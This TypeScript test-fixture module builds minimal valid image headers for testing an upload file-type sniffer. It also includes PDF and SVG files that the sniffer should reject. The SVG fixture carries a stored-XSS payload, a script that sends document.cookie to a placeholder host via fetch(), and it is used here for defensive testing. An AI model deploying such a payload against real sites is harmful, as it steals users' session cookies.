/**
 * Minimal but GENUINELY VALID image files, built byte by byte.
 *
 * Not decorative test data. The whole point of `probeImage` is that it reads
 * real file structure rather than trusting a declared content type, so testing
 * it against `Buffer.from('fake png')` would prove nothing -- and testing it
 * against a checked-in binary fixture would make the reason each byte matters
 * invisible to the next reader. Constructing the headers here means the test
 * and the parser are looking at the same specification.
 *
 * These live in the shipped package rather than in a spec file because both
 * the unit suite and the real-PostgreSQL HTTP suite need them, and they sit in
 * different projects. Same reasoning `libs/testing` already embodies.
 *
 * Each function produces a file with a correct HEADER and arbitrary padding
 * where pixel data would be. That is sufficient and honest: the probe reads
 * headers and nothing else, and a fully encoded image would require an encoder
 * -- the exact dependency this module exists to avoid.
 */

/** A PNG whose IHDR declares the given dimensions. */
export function pngFixture(width: number, height: number, padBytes = 512): Buffer {
  const signature = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

  const ihdr = Buffer.alloc(25);
  ihdr.writeUInt32BE(13, 0); // chunk length
  ihdr.write('IHDR', 4, 'ascii');
  ihdr.writeUInt32BE(width, 8);
  ihdr.writeUInt32BE(height, 12);
  ihdr[16] = 8; // bit depth
  ihdr[17] = 6; // colour type: RGBA
  // 18..20 are compression/filter/interlace, all zero; 21..24 would be the
  // CRC, which nothing here verifies and which a real decoder would.

  return Buffer.concat([signature, ihdr, Buffer.alloc(padBytes)]);
}

/** A JPEG carrying an APP0 segment and then a baseline SOF0 frame header. */
export function jpegFixture(width: number, height: number, padBytes = 512): Buffer {
  const soi = Buffer.from([0xff, 0xd8]);

  // A real JFIF APP0, present so the SOF marker is genuinely reached by
  // WALKING the segment chain rather than being the first thing in the file.
  // A parser that only looked at a fixed offset would pass without it.
  // 18 bytes: a 2-byte marker plus a 16-byte segment whose own length field
  // COUNTS ITSELF. Getting that off by two leaves two stray bytes between
  // segments, the parser resumes where no marker is, and every JPEG is
  // rejected -- which is exactly how this fixture failed the first time it ran.
  const app0 = Buffer.alloc(18);
  app0[0] = 0xff;
  app0[1] = 0xe0;
  app0.writeUInt16BE(16, 2); // segment length, inclusive of these two bytes
  app0.write('JFIF\0', 4, 'ascii');

  const sof0 = Buffer.alloc(11);
  sof0[0] = 0xff;
  sof0[1] = 0xc0;
  sof0.writeUInt16BE(9, 2); // segment length
  sof0[4] = 8; // sample precision
  sof0.writeUInt16BE(height, 5);
  sof0.writeUInt16BE(width, 7);
  sof0[9] = 1; // one component
  sof0[10] = 1; // component id

  return Buffer.concat([soi, app0, sof0, Buffer.alloc(padBytes)]);
}

/** A lossless (VP8L) WebP. */
export function webpFixture(width: number, height: number, padBytes = 512): Buffer {
  const buffer = Buffer.alloc(30 + padBytes);
  buffer.write('RIFF', 0, 'ascii');
  buffer.writeUInt32LE(buffer.length - 8, 4);
  buffer.write('WEBP', 8, 'ascii');
  buffer.write('VP8L', 12, 'ascii');
  buffer.writeUInt32LE(buffer.length - 20, 16);
  buffer[20] = 0x2f; // VP8L signature byte
  // 14 bits of (width - 1), then 14 bits of (height - 1).
  buffer.writeUInt32LE(((height - 1) << 14) | (width - 1), 21);
  return buffer;
}

/**
 * Bytes that are definitively NOT an image this platform accepts.
 *
 * A real, well-formed PDF header rather than random noise: the interesting
 * rejection is a file that IS a valid document of some other type, because
 * that is what an uploader trying to smuggle something past a content check
 * would actually send.
 */
export function pdfFixture(): Buffer {
  return Buffer.concat([Buffer.from('%PDF-1.7\n%\xe2\xe3\xcf\xd3\n', 'binary'), Buffer.alloc(512)]);
}

/**
 * An SVG.
 *
 * Called out separately from `pdfFixture` because it is the rejection that
 * matters most: SVG is an executable document, and one served from an origin
 * that holds a session is a stored-XSS vector. It must be refused by the
 * SNIFF, not merely absent from the declared-type allow-list -- a client
 * declaring `image/png` and uploading this is the whole attack.
 */
export function svgFixture(): Buffer {
  return Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">' +
      '<script>fetch("https://example.invalid/"+document.cookie)</script></svg>',
    'utf8',
  );
}
